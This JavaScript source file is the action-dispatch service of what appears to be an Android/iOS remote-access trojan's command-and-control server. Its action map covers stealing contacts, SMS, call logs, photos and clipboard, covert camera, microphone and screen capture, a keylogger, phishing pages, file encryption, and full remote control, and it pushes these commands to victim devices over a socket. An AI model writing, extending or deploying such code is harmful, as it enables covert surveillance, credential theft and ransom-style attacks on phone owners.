/**
 * Action service - Business logic for device actions
 */

const logger = require('../utils/logger');
const { NotFoundError, ValidationError } = require('../utils/errors');
const { isActionSupported, getPlatformActionName, getPlatformActions } = require('../config/platformActions');

class ActionService {
  constructor(deviceService, io) {
    this.deviceService = deviceService;
    this.io = io;
  }

  /**
   * Action mapping
   */
  actionMap = {
    'contacts': 'contacts',
    'sms': 'sms',
    'calls': 'calls',
    'gallery': 'gallery',
    'main-camera': 'main-camera',
    'selfie-camera': 'selfie-camera',
    'screenshot': 'screenshot',
    'toast': 'toast',
    'vibrate': 'vibrate',
    'sendSms': 'sendSms',
    'all-sms': 'all-sms',
    'popNotification': 'popNotification',
    'keylogger-on': 'keylogger-on',
    'keylogger-off': 'keylogger-off',
    'clipboard': 'clipboard',
    'openUrl': 'openUrl',
    'open-url': 'openUrl',
    'microphone': 'microphone',
    'play-audio': 'play-audio',
    'stop-audio': 'stop-audio',
    'phishing': 'phishing',
    'encrypt': 'encrypt',
    'decrypt': 'decrypt',
    'apps': 'apps',
    'file-explorer': 'file-explorer',
    'screen-stream-start': 'screen-stream-start',
    'screen-stream-stop': 'screen-stream-stop',
    'remote-control-start': 'remote-control-start',
    'remote-control-stop': 'remote-control-stop',
  };

  /**
   * Execute action on device
   * @param {string} deviceId - Device ID
   * @param {string} action - Action name
   * @param {Object} params - Action parameters
   */
  async executeAction(deviceId, action, params) {
    try {
      // Check if device is connected
      if (!this.deviceService.isDeviceConnected(deviceId)) {
        throw new NotFoundError('Device not connected');
      }

      // Validate action
      if (!action || typeof action !== 'string') {
        throw new ValidationError('Action is required and must be a string');
      }

      // Get device info to check platform
      const device = await this.deviceService.getDeviceById(deviceId);
      const platform = device.info.platform || 'android';

      // Check if action is supported on platform
      if (!isActionSupported(action, platform)) {
        throw new ValidationError(`Action '${action}' is not supported on ${platform} platform`);
      }

      // Get platform-specific action name
      const deviceAction = getPlatformActionName(this.actionMap[action] || action, platform);

      // Convert params to extras format
      let extras = [];
      if (Array.isArray(params)) {
        extras = params;
      } else if (params && typeof params === 'object') {
        extras = Object.keys(params).map(key => ({
          key: key,
          value: params[key],
        }));
      }

      // Emit command to device
      this.deviceService.emitToDevice(deviceId, 'commend', {
        request: deviceAction,
        extras: extras,
      });

      // Update keylogger status if needed
      if (deviceAction === 'keylogger-on' || deviceAction === 'keylogger-off') {
        await this.deviceService.updateDeviceData(deviceId, 'keylogger-status', {
          enabled: deviceAction === 'keylogger-on',
        });
      }

      logger.info(`Action ${action} executed on device ${deviceId} [${platform}]`);

      return {
        success: true,
        message: 'Action sent to device',
        action: deviceAction,
        platform: platform,
      };
    } catch (error) {
      logger.error(`Error executing action ${action} on device ${deviceId}:`, error);
      throw error;
    }
  }

  /**
   * Get available actions
   * @param {string} platform - Optional platform filter ('android' or 'ios')
   * @returns {Array} Array of available action names
   */
  getAvailableActions(platform = null) {
    if (!platform) {
      return Object.keys(this.actionMap);
    }
    
    const platformActions = getPlatformActions(platform);
    // Filter to only return actions that are in our actionMap
    return platformActions.filter(action => this.actionMap[action] !== undefined);
  }
}

module.exports = ActionService;

